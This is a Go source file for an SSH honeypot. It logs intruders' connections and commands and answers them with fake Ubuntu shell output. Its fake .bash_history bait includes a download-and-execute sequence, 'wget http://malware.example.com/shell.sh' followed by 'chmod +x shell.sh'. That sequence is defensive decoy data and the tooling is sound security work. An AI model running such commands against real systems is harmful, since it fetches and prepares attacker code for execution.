package ssh

import (
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/rs/zerolog/log"
	gossh "golang.org/x/crypto/ssh"
)

type Handler struct {
	logger   *Logger
	hostname string
}

func NewHandler(logger *Logger, hostname string) *Handler {
	return &Handler{
		logger:   logger,
		hostname: hostname,
	}
}

func (h *Handler) HandleConn(conn net.Conn, sshConn *gossh.ServerConn, chans <-chan gossh.NewChannel, reqs <-chan *gossh.Request) {
	srcIP, srcPort := parseAddr(conn.RemoteAddr().String())

	log.Info().
		Str("ip", srcIP).
		Int("port", srcPort).
		Str("client", string(sshConn.ClientVersion())).
		Msg("SSH connection established")

	h.logger.LogConnect(srcIP, srcPort, string(sshConn.ClientVersion()))

	go gossh.DiscardRequests(reqs)

	for newChan := range chans {
		if newChan.ChannelType() != "session" {
			newChan.Reject(gossh.UnknownChannelType, "unsupported channel type")
			continue
		}

		ch, requests, err := newChan.Accept()
		if err != nil {
			log.Error().Err(err).Msg("Failed to accept channel")
			return
		}

		go h.handleSession(ch, requests, srcIP, srcPort, string(sshConn.User()))
	}
}

func (h *Handler) handleSession(ch gossh.Channel, requests <-chan *gossh.Request, srcIP string, srcPort int, user string) {
	defer ch.Close()

	for req := range requests {
		switch req.Type {
		case "pty-req":
			if req.WantReply {
				req.Reply(true, nil)
			}
			h.startShell(ch, srcIP, srcPort, user)
			return

		case "exec":
			if req.WantReply {
				req.Reply(true, nil)
			}
			cmd := parseExecPayload(req.Payload)
			log.Info().Str("ip", srcIP).Str("cmd", cmd).Msg("SSH exec command")
			h.logger.LogCommand(srcIP, srcPort, user, cmd)
			output := h.fakeExec(cmd)
			ch.Write([]byte(output + "\n"))
			ch.SendRequest("exit-status", false, []byte{0, 0, 0, 0})
			return

		case "shell":
			if req.WantReply {
				req.Reply(true, nil)
			}
			h.startShell(ch, srcIP, srcPort, user)
			return

		default:
			if req.WantReply {
				req.Reply(false, nil)
			}
		}
	}
}

func (h *Handler) startShell(ch gossh.Channel, srcIP string, srcPort int, user string) {
	prompt := fmt.Sprintf("%s@%s:~$ ", user, h.hostname)
	ch.Write(fmt.Appendf(nil, "Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)\r\n\r\n"))
	ch.Write([]byte(" * Documentation:  https://help.ubuntu.com\r\n"))
	ch.Write([]byte(" * Management:     https://landscape.canonical.com\r\n\r\n"))
	ch.Write(fmt.Appendf(nil, "Last login: %s from 192.168.1.1\r\n\r\n", time.Now().Add(-24*time.Hour).Format("Mon Jan 2 15:04:05 2006")))
	ch.Write([]byte(prompt))

	buf := make([]byte, 1024)
	var cmdBuf strings.Builder

	for {
		n, err := ch.Read(buf)
		if err != nil {
			break
		}

		data := buf[:n]

		for _, b := range data {
			switch b {
			case '\r', '\n':
				ch.Write([]byte("\r\n"))
				cmd := strings.TrimSpace(cmdBuf.String())
				cmdBuf.Reset()

				if cmd == "" {
					ch.Write([]byte(prompt))
					continue
				}

				log.Info().
					Str("ip", srcIP).
					Str("user", user).
					Str("cmd", cmd).
					Msg("SSH command captured")

				h.logger.LogCommand(srcIP, srcPort, user, cmd)

				if cmd == "exit" || cmd == "logout" {
					ch.Write([]byte("logout\r\n"))
					return
				}

				output := h.fakeExec(cmd)
				if output != "" {
					ch.Write([]byte(output + "\r\n"))
				}
				ch.Write([]byte(prompt))

			case 127, 8:
				s := cmdBuf.String()
				if len(s) > 0 {
					cmdBuf.Reset()
					cmdBuf.WriteString(s[:len(s)-1])
					ch.Write([]byte("\b \b"))
				}

			default:
				cmdBuf.WriteByte(b)
				ch.Write([]byte{b})
			}
		}
	}
}

func (h *Handler) fakeExec(cmd string) string {
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return ""
	}

	base := parts[0]

	switch base {
	case "id":
		return "uid=0(root) gid=0(root) groups=0(root)"
	case "whoami":
		return "root"
	case "uname":
		return "Linux " + h.hostname + " 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux"
	case "pwd":
		return "/root"
	case "ls":
		return "backup  documents  scripts  .bash_history  .ssh"
	case "cat":
		if len(parts) > 1 {
			return h.fakeCat(parts[1])
		}
		return ""
	case "ps":
		return "  PID TTY          TIME CMD\r\n    1 ?        00:00:01 systemd\r\n  842 ?        00:00:00 sshd\r\n 1024 pts/0    00:00:00 bash"
	case "netstat", "ss":
		return "tcp   LISTEN  0  128  0.0.0.0:22   0.0.0.0:*"
	case "ifconfig", "ip":
		return "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\r\n        inet 10.0.0.1  netmask 255.255.255.0  broadcast 10.0.0.255"
	case "history":
		return "    1  apt update\r\n    2  apt install nginx\r\n    3  systemctl start nginx\r\n    4  ls /var/www"
	case "wget", "curl":
		return "Connecting...\r\nDownload failed: Connection refused"
	case "sudo":
		return "[sudo] password for " + "user" + ":"
	default:
		return fmt.Sprintf("bash: %s: command not found", base)
	}
}

func (h *Handler) fakeCat(path string) string {
	switch path {
	case "/etc/passwd":
		return "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
	case "/etc/shadow":
		return "Permission denied"
	case "/etc/hostname":
		return h.hostname
	case "/etc/os-release":
		return "NAME=\"Ubuntu\"\nVERSION=\"22.04.3 LTS (Jammy Jellyfish)\"\nID=ubuntu"
	case ".bash_history":
		return "ls -la\ncat /etc/passwd\nwget http://malware.example.com/shell.sh\nchmod +x shell.sh"
	default:
		return fmt.Sprintf("cat: %s: No such file or directory", path)
	}
}

func parseAddr(addr string) (string, int) {
	host, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		return addr, 0
	}
	port := 0
	fmt.Sscanf(portStr, "%d", &port)
	return host, port
}

func parseExecPayload(payload []byte) string {
	if len(payload) < 4 {
		return ""
	}
	length := int(payload[0])<<24 | int(payload[1])<<16 | int(payload[2])<<8 | int(payload[3])
	if len(payload) < 4+length {
		return string(payload[4:])
	}
	return string(payload[4 : 4+length])
}